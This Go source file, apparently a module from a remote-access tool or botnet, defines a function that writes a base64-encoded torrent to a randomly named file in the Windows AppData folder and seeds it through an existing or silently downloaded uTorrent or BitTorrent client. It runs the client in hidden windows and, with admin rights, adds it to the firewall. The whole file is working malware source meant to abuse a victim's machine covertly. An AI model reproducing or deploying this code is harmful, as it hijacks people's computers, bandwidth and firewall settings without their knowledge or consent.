package core

import (
	"io"
	"net/http"
	"os"
	"os/exec"
	"syscall"
)

func ExternalSeeder(torrent string) {
	if CheckIfFileExists(os.Getenv("APPDATA") + "\\uTorrent\\uTorrent.exe") {
		n := RandomString(5)
		n_Torrent, _ := os.Create(os.Getenv("APPDATA") + "\\" + n + ".torrent")
		n_Torrent.WriteString(Base64Decode(torrent))
		n_Torrent.Close()
		Command := string(os.Getenv("APPDATA") + "\\uTorrent\\uTorrent.exe" + " /HIDE /DIRECTORY " + os.Getenv("APPDATA") + " " + os.Getenv("APPDATA") + "\\" + n + ".torrent")
		Exec := exec.Command("cmd", "/C", Command)
		Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		Exec.Start()
	} else if CheckIfFileExists(os.Getenv("APPDATA") + "\\BitTorrent\\BitTorrent.exe") {
		n := RandomString(5)
		n_Torrent, _ := os.Create(os.Getenv("APPDATA") + "\\" + n + ".torrent")
		n_Torrent.WriteString(Base64Decode(torrent))
		n_Torrent.Close()
		Command := string(os.Getenv("APPDATA") + "\\BitTorrent\\BitTorrent.exe" + " /HIDE /DIRECTORY " + os.Getenv("APPDATA") + " " + os.Getenv("APPDATA") + "\\" + n + ".torrent")
		Exec := exec.Command("cmd", "/C", Command)
		Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		Exec.Start()
	} else if CheckIfFileExists(os.Getenv("APPDATA") + "\\uTorrent.exe") {
		n := RandomString(5)
		n_Torrent, _ := os.Create(os.Getenv("APPDATA") + "\\" + n + ".torrent")
		n_Torrent.WriteString(Base64Decode(torrent))
		n_Torrent.Close()
		Command := string(os.Getenv("APPDATA") + "\\uTorrent.exe" + " /NOINSTALL /HIDE /DIRECTORY " + os.Getenv("APPDATA") + " " + os.Getenv("APPDATA") + "\\" + n + ".torrent")
		Exec := exec.Command("cmd", "/C", Command)
		Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		Exec.Start()
	} else if CheckIfFileExists(os.Getenv("LOCALAPPDATA") + "\\transmission") {
		n := RandomString(5)
		n_Torrent, _ := os.Create(os.Getenv("APPDATA") + "\\Torrents\\" + n + ".torrent")
		n_Torrent.WriteString(Base64Decode(torrent))
		n_Torrent.Close()
	} else { //Non found, Lets download.
		output, _ := os.Create(os.Getenv("APPDATA") + "\\" + "uTorrent.exe")
		defer output.Close()
		response, _ := http.Get("http://download.ap.bittorrent.com/track/stable/endpoint/utorrent/os/windows")
		defer response.Body.Close()
		_, _ = io.Copy(output, response.Body)
		if AdminState {
			AddToFirewall("uTorrent", os.Getenv("APPDATA")+"\\"+"uTorrent.exe")
		}
		n := RandomString(5)
		n_Torrent, _ := os.Create(os.Getenv("APPDATA") + "\\" + n + ".torrent")
		n_Torrent.WriteString(Base64Decode(torrent))
		n_Torrent.Close()
		Command := string(os.Getenv("APPDATA") + "\\" + "uTorrent.exe" + " /NOINSTALL /HIDE /DIRECTORY " + os.Getenv("APPDATA") + " " + os.Getenv("APPDATA") + "\\" + n + ".torrent")
		Exec := exec.Command("cmd", "/C", Command)
		Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		Exec.Start()
	}
}

//Internal Seeder?
